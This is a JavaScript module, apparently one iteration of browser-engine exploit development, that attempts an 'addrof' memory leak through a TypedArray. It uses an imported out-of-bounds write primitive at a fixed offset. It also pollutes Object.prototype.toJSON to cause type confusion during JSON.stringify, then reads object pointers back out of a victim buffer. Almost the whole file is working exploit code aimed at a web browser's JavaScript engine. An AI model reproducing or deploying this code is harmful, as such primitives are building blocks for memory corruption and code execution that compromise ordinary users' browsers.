// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v23_ReFocusOnThisConfusedObject_FixRefError)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

// Renomeado para refletir a correção do ReferenceError
export const FNAME_MODULE_TYPEDARRAY_ADDROF_V23_RFCTO_FRE = "OriginalHeisenbug_TypedArrayAddrof_v23_ReFocus_FixRefError";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;
const AGGRESSIVE_WRITE_COUNT_V23 = 16; 

let object_to_leak_A_v23 = null;
let object_to_leak_B_v23 = null;
let victim_typed_array_ref_v23 = null; 
let probe_call_count_v23 = 0;
let last_probe_details_v23 = null; 
const PROBE_CALL_LIMIT_V23 = 5;


function toJSON_TA_Probe_ReFocus_FRE() { // Renomeado para _FRE
    probe_call_count_v23++;
    const call_num = probe_call_count_v23;
    let current_call_details = {
        call_number: call_num,
        probe_variant: "TA_Probe_Addrof_v23_ReFocus_FixRefError", // Atualizado
        this_type: Object.prototype.toString.call(this),
        this_is_victim_array: (this === victim_typed_array_ref_v23),
        this_had_victim_ref_prop: false, // Mantido da v23 original, embora não usado ativamente aqui
        writes_on_confused_this_attempted: false,
        writes_on_this_victim_ref_attempted: false, // Mantido da v23 original
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type}. IsVictimArray? ${current_call_details.this_is_victim_array}.`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V23) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Probe call limit exceeded. Returning simple object.`, "warn");
            last_probe_details_v23 = current_call_details; // Ainda registra os detalhes finais
            return { recursion_stopped_v23_fre: true };
        }

        if (call_num === 1 && current_call_details.this_is_victim_array) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim_array. Returning marker object with victim reference.`, "info");
            // Retornar um objeto que CONTÉM a vítima.
            last_probe_details_v23 = current_call_details;
            return { 
                probe_marker_v23: call_num, 
                victim_in_marker: victim_typed_array_ref_v23 
            };
        } else if (current_call_details.this_type === '[object Object]') { 
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION DETECTED for 'this'! (IsVictimArray? ${current_call_details.this_is_victim_array})`, "vuln");
            
            let is_expected_marker = false;
            if (this && this.probe_marker_v23 === (call_num - 1) && this.hasOwnProperty('victim_in_marker')) {
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Confused 'this' IS the marker object from call #${call_num - 1}.`, "info");
                current_call_details.this_had_victim_ref_prop = true; // Confirma que 'this' é o marcador
                is_expected_marker = true;
                
                logS3(`   Attempting AGGRESSIVE writes on this.victim_in_marker (the original victim)...`, "warn");
                try {
                    for (let i = 0; i < AGGRESSIVE_WRITE_COUNT_V23; i++) {
                        this.victim_in_marker[i] = (i % 2 === 0) ? object_to_leak_A_v23 : object_to_leak_B_v23;
                    }
                    current_call_details.writes_on_this_victim_ref_attempted = true; // Escritas na referência da vítima
                    logS3(`   Aggressive writes to this.victim_in_marker completed.`, "info");
                } catch (e_victim_write) {
                    logS3(`   ERROR during aggressive writes to this.victim_in_marker: ${e_victim_write.message}`, "error");
                    current_call_details.error_in_probe = (current_call_details.error_in_probe || "") + ` VictimWriteErr: ${e_victim_write.message};`;
                }
            } else {
                 logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Confused 'this' is not the expected marker, or victim_in_marker missing. Standard writes on 'this'.`, "warn");
            }
            
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Attempting standard addrof writes on this confused 'this' itself...`, "warn");
            if (object_to_leak_A_v23) this["confused_this_prop_A"] = object_to_leak_A_v23; // Usar nomes de propriedade diferentes
            if (object_to_leak_B_v23) this["confused_this_prop_B"] = object_to_leak_B_v23;
            current_call_details.writes_on_confused_this_attempted = true; // Escritas no 'this' confuso
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Standard writes to confused 'this' attempted.`, "info");
            
            last_probe_details_v23 = current_call_details;
            // Se 'this' era o marcador, retornar o 'this' modificado pode ser interessante para o stringifyOutput
            // Caso contrário, retornar um novo marcador.
            return is_expected_marker ? this : { probe_marker_v23: call_num, victim_in_marker: this.victim_in_marker }; 

        } else {
             logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' (type: ${current_call_details.this_type}) is not victim and not [object Object].`, "warn");
        }
    } catch (e) {
        current_call_details.error_in_probe = (current_call_details.error_in_probe || "") + `OuterProbeErr: ${e.name}: ${e.message}`;
    }
    
    last_probe_details_v23 = current_call_details;
    return { probe_marker_v23: call_num, generic_v23_fre: true }; 
}

export async function executeTypedArrayVictimAddrofTest_ReFocus_FixRefError() { // Renomeado
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V23_RFCTO_FRE}.triggerAndLog`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (ReFocus_FixRefError) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V23_RFCTO_FRE} Init...`;

    probe_call_count_v23 = 0;
    last_probe_details_v23 = null; 
    victim_typed_array_ref_v23 = null; 
    // A linha controller_object_ref_v21 = null; FOI REMOVIDA DAQUI
    object_to_leak_A_v23 = { marker: "ObjA_TA_v23fre", id: Date.now() };  // _fre for FixRefError
    object_to_leak_B_v23 = { marker: "ObjB_TA_v23fre", id: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let stringifyOutput = null; 
    let captured_last_probe_details_final = null; 
    
    let addrof_A = { success: false, msg: "Addrof A (victim_buffer[0]): Default" };
    let addrof_B = { success: false, msg: "Addrof B (victim_buffer[1]): Default" };
    // Adicionar resultados para as propriedades do objeto confuso/marcador, se stringifyOutput for esse objeto
    let addrof_Confused_A = { success: false, msg: "Addrof confused_this_prop_A: Default"};
    let addrof_Confused_B = { success: false, msg: "Addrof confused_this_prop_B: Default"};

    const fillPattern = 0.23232323232323;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v23 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
        let float64_view_on_victim_buffer = new Float64Array(victim_typed_array_ref_v23.buffer); 
        for(let i = 0; i < float64_view_on_victim_buffer.length; i++) float64_view_on_victim_buffer[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v23 (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_ReFocus_FRE, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            stringifyOutput = JSON.stringify(victim_typed_array_ref_v23); 
            logS3(`  JSON.stringify completed. Stringify Output: ${JSON.stringify(stringifyOutput)}`, "info", FNAME_CURRENT_TEST); // Log completo
            
            if (last_probe_details_v23) {
                captured_last_probe_details_final = JSON.parse(JSON.stringify(last_probe_details_v23)); 
            }
            logS3(`  EXECUTE: Captured details of LAST probe run: ${captured_last_probe_details_final ? JSON.stringify(captured_last_probe_details_final) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugObservedInLastProbe = false;
            if (captured_last_probe_details_final && 
                captured_last_probe_details_final.this_type === "[object Object]") { 
                heisenbugObservedInLastProbe = true;
            }
            
            logS3(`  EXECUTE: Heisenbug on 'this' of LAST probe call ${heisenbugObservedInLastProbe ? "CONFIRMED" : "NOT Confirmed"}. Last type: ${captured_last_probe_details_final ? captured_last_probe_details_final.this_type : 'N/A'}`, heisenbugObservedInLastProbe ? "vuln" : "error", FNAME_CURRENT_TEST);

            // Verificar buffer da vítima
            logS3("STEP 3: Checking victim buffer for addrof...", "warn", FNAME_CURRENT_TEST);
            const val_A = float64_view_on_victim_buffer[0];
            let temp_A_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_A]).buffer)[0], new Uint32Array(new Float64Array([val_A]).buffer)[1]);
            if (val_A !== (fillPattern + 0) && val_A !== 0 && (temp_A_int64.high() < 0x00020000 || (temp_A_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                addrof_A.success = true; addrof_A.msg = `Possible pointer for ObjA in victim_buffer[0]: ${temp_A_int64.toString(true)}`;
            } else { addrof_A.msg = `No pointer for ObjA in victim_buffer[0]. Val: ${val_A}`; }
            logS3(`  Value read from victim_buffer[0]: ${val_A} (${temp_A_int64.toString(true)})`, "leak");

            const val_B = float64_view_on_victim_buffer[1];
            let temp_B_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_B]).buffer)[0], new Uint32Array(new Float64Array([val_B]).buffer)[1]);
            if (val_B !== (fillPattern + 1) && val_B !== 0 && (temp_B_int64.high() < 0x00020000 || (temp_B_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                addrof_B.success = true; addrof_B.msg = `Possible pointer for ObjB in victim_buffer[1]: ${temp_B_int64.toString(true)}`;
            } else { addrof_B.msg = `No pointer for ObjB in victim_buffer[1]. Val: ${val_B}`; }
            logS3(`  Value read from victim_buffer[1]: ${val_B} (${temp_B_int64.toString(true)})`, "leak");

            // Verificar stringifyOutput (que é o objeto marcador retornado pela Call #1, possivelmente modificado pela Call #2 se 'this' era ele)
            logS3("STEP 4: Checking stringifyOutput for leaked properties...", "warn", FNAME_CURRENT_TEST);
            if (stringifyOutput && typeof stringifyOutput === 'object') {
                 const confused_A_val = stringifyOutput["confused_this_prop_A"]; // Checa a propriedade que a Call #2/3 poderia ter definido
                 if (typeof confused_A_val === 'number' && confused_A_val !== 0) {
                    let s_A_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([confused_A_val]).buffer)[0], new Uint32Array(new Float64Array([confused_A_val]).buffer)[1]);
                    if (s_A_int64.high() < 0x00020000 || (s_A_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                       addrof_Confused_A.success = true; addrof_Confused_A.msg = `Possible pointer for confused_this_prop_A in stringifyOutput: ${s_A_int64.toString(true)}`;
                    } else { addrof_Confused_A.msg = `stringifyOutput.confused_this_prop_A is number but not pointer-like: ${confused_A_val}`; }
                 } else if (confused_A_val === object_to_leak_A_v23) {
                     addrof_Confused_A.success = true; addrof_Confused_A.msg = "object_to_leak_A_v23 identity found in stringifyOutput.confused_this_prop_A.";
                 } else { addrof_Confused_A.msg = `stringifyOutput.confused_this_prop_A not a pointer. Value: ${confused_A_val}`; }

                 const confused_B_val = stringifyOutput["confused_this_prop_B"];
                 if (typeof confused_B_val === 'number' && confused_B_val !== 0) {
                    let s_B_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([confused_B_val]).buffer)[0], new Uint32Array(new Float64Array([confused_B_val]).buffer)[1]);
                     if (s_B_int64.high() < 0x00020000 || (s_B_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                       addrof_Confused_B.success = true; addrof_Confused_B.msg = `Possible pointer for confused_this_prop_B in stringifyOutput: ${s_B_int64.toString(true)}`;
                    } else { addrof_Confused_B.msg = `stringifyOutput.confused_this_prop_B is number but not pointer-like: ${confused_B_val}`; }
                 } else if (confused_B_val === object_to_leak_B_v23) {
                     addrof_Confused_B.success = true; addrof_Confused_B.msg = "object_to_leak_B_v23 identity found in stringifyOutput.confused_this_prop_B.";
                 } else { addrof_Confused_B.msg = `stringifyOutput.confused_this_prop_B not a pointer. Value: ${confused_B_val}`; }
            } else {
                 addrof_Confused_A.msg = "stringifyOutput was not an object or was null.";
                 addrof_Confused_B.msg = "stringifyOutput was not an object or was null.";
            }


            if (addrof_A.success || addrof_B.success || addrof_Confused_A.success || addrof_Confused_B.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V23_RFCTO_FRE}: Addr? SUCESSO!`;
            } else if (heisenbugObservedInLastProbe) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V23_RFCTO_FRE}: Heisenbug OK, Addr Fail`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V23_RFCTO_FRE}: No Heisenbug?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V23_RFCTO_FRE}: Stringify/Addrof ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V23_RFCTO_FRE} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v23}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof Victim A: Success=${addrof_A.success}, Msg='${addrof_A.msg}'`, addrof_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof Victim B: Success=${addrof_B.success}, Msg='${addrof_B.msg}'`, addrof_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof ConfusedObj A: Success=${addrof_Confused_A.success}, Msg='${addrof_Confused_A.msg}'`, addrof_Confused_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof ConfusedObj B: Success=${addrof_Confused_B.success}, Msg='${addrof_Confused_B.msg}'`, addrof_Confused_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        
        victim_typed_array_ref_v23 = null; 
        last_probe_details_v23 = null;
        probe_call_count_v23 = 0;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: errorCapturedMain?.name === 'RangeError', 
        stringifyResult: stringifyOutput, 
        toJSON_details: captured_last_probe_details_final, 
        total_probe_calls: probe_call_count_v23,
        addrof_victim_A: addrof_A,
        addrof_victim_B: addrof_B,
        addrof_confused_A: addrof_Confused_A,
        addrof_confused_B: addrof_Confused_B,
    };
}
